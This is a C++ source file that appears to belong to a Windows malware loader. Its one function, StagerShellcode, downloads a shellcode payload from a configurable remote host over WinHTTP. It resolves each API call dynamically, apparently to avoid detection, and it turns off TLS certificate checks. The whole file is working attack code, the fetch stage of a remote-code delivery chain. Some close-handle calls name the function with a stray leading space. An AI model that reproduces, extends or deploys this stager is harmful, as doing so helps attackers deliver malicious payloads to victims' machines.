#include <windows.h>
#include <winhttp.h>

#include <Macros.h>
#include <Config.h>
#include <Loader.hh>

BOOL StagerShellcode( 
    _In_     LPCWSTR    Host,
    _In_     INT        Port,
    _In_     LPCWSTR    Path,
    _In_     BOOL       Secure,
    _In_     LPCWSTR    MethodReq,
    _In_opt_ LPCWSTR    UserAgent,
    _In_opt_ LPCWSTR    HeadersAdds,
    _Out_    PBYTE     *pBufferRet,
    _Out_    ULONG_PTR *BufferSzRet
) {
    /*=========================[ Request Winhttp ]=========================*/

    HINTERNET hSession = NULL, 
              hConnect = NULL, 
              hRequest = NULL;

    PBYTE   pBuffer    = NULL;
    ULONG64 BuffSize   = 0;
    DWORD   BytesRead  = 0;
    PBYTE   pTemp      = B_PTR( bkCall<HLOCAL>( "Kernel32", "LocalAlloc", LPTR, 1024 ) );

    BOOL bResult = FALSE;  

    hSession = bkCall<HINTERNET>( 
        "WinHttp", "WinHttpOpen", 
        UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, 
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 
    );
    if ( !hSession ) goto _Cleanup;

    hConnect = bkCall<HINTERNET>( "WinHttp", "WinHttpConnect", hSession, Host, Port, 0 );
    if ( !hConnect ) goto _Cleanup;

    if ( Secure ) {
        
        hRequest = bkCall<HINTERNET>( 
            "WinHttp", "WinHttpOpenRequest", 
            hConnect, MethodReq, Path, NULL, 
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE 
        );
        if ( !hRequest ) goto _Cleanup;

        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if (! bkCall<HINTERNET>( "WinHttp", "WinHttpSetOption", hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags) ) ) 
            goto _Cleanup;
        
    } else {
        hRequest = bkCall<HINTERNET>( 
            "WinHttp", "WinHttpOpenRequest", 
            hConnect, MethodReq, Path, NULL, 
            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0 
        );
        if ( !hRequest ) goto _Cleanup;
    }

    if ( !HeadersAdds )
        HeadersAdds = WINHTTP_NO_ADDITIONAL_HEADERS;

    bResult = bkCall<BOOL>( "WinHttp", "WinHttpSendRequest", hRequest, HeadersAdds, -1, WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );
    if ( !bResult ) goto _Cleanup;

    bResult = bkCall<BOOL>( "WinHttp", "WinHttpReceiveResponse", hRequest, NULL );
    if ( !bResult ) goto _Cleanup;
    
    if ( !pTemp ) {
        bResult = FALSE;
        goto _Cleanup;
    }

    while( TRUE ) {

        bResult = bkCall<BOOL>( "WinHttp", "WinHttpReadData", hRequest, pTemp, 1024, &BytesRead );
        if ( !bResult ) {
            bkCall<HLOCAL>( "Kernel32", "LocalFree", pTemp );
            goto _Cleanup;
        }

        BuffSize += BytesRead;

        if ( pBuffer == NULL )
            pBuffer = B_PTR( bkCall<HLOCAL>( "Kernel32", "LocalAlloc", LPTR, BytesRead ) );
        else
            pBuffer = B_PTR( bkCall<HLOCAL>( "Kernel32", "LocalReAlloc", pBuffer, BuffSize, LMEM_MOVEABLE | LMEM_ZEROINIT ) );

        if ( pBuffer == NULL ) {
            bResult = FALSE; 
            bkCall<HLOCAL>( "Kernel32", "LocalFree", pTemp );
            goto _Cleanup;
        }

        bkMemory::Copy<VOID>( C_PTR( ( pBuffer + (BuffSize - BytesRead) ) ), pTemp, BytesRead ) ;
        bkMemory::Set<VOID>( pTemp, '\0', BytesRead );

        if (BytesRead < 1024)
            break;

    } 

    *pBufferRet  = pBuffer;
    *BufferSzRet = BuffSize;

    bkCall<HLOCAL>( "Kernel32", "LocalFree", pTemp );

    bResult = TRUE;

_Cleanup:
    if ( hRequest ) bkCall<BOOL>( "WinHttp", " WinHttpCloseHandle", hRequest );
    if ( hConnect ) bkCall<BOOL>( "WinHttp", " WinHttpCloseHandle", hConnect );
    if ( hSession ) bkCall<BOOL>( "WinHttp", " WinHttpCloseHandle", hSession );

    return bResult;
}